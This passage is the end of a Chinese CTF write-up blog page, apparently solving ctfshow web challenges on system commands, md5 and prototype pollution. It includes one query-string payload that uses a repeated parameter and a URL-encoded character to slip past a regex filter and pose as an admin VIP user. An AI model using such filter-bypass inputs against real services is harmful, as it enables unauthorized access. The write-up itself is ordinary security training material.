+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?query&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;&amp;query&#x3D;&quot;password&quot;:&quot;%63tfshow&quot;&amp;query&#x3D;&quot;isVIP&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>引号url编码为%22与c形成%22c匹配正则，所以编码c</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/11/14/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/" rel="prev" title="陇原战疫2021网络安全大赛">
+      <i class="fa fa-chevron-left"></i> 陇原战疫2021网络安全大赛
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#334"><span class="nav-number">1.</span> <span class="nav-text">334</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#335-336-%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="nav-number">2.</span> <span class="nav-text">335-336-系统命令</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#367-md5"><span class="nav-number">3.</span> <span class="nav-text">367-md5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#368-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="nav-number">4.</span> <span class="nav-text">368-原型链污染</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#339"><span class="nav-number">5.</span> <span class="nav-text">339</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="nav-number">5.1.</span> <span class="nav-text">非预期</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="nav-number">5.2.</span> <span class="nav-text">预期解</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#340"><span class="nav-number">6.</span> <span class="nav-text">340</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#341"><span class="nav-number">7.</span> <span class="nav-text">341</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#342-343"><span class="nav-number">8.</span> <span class="nav-text">342-343</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#344"><span class="nav-number">9.</span> <span class="nav-text">344</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Y0ng"
+      src="/images/cys.jpg">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">110</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:1216043519@qq.com" title="E-Mail → mailto:1216043519@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Y0ng</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
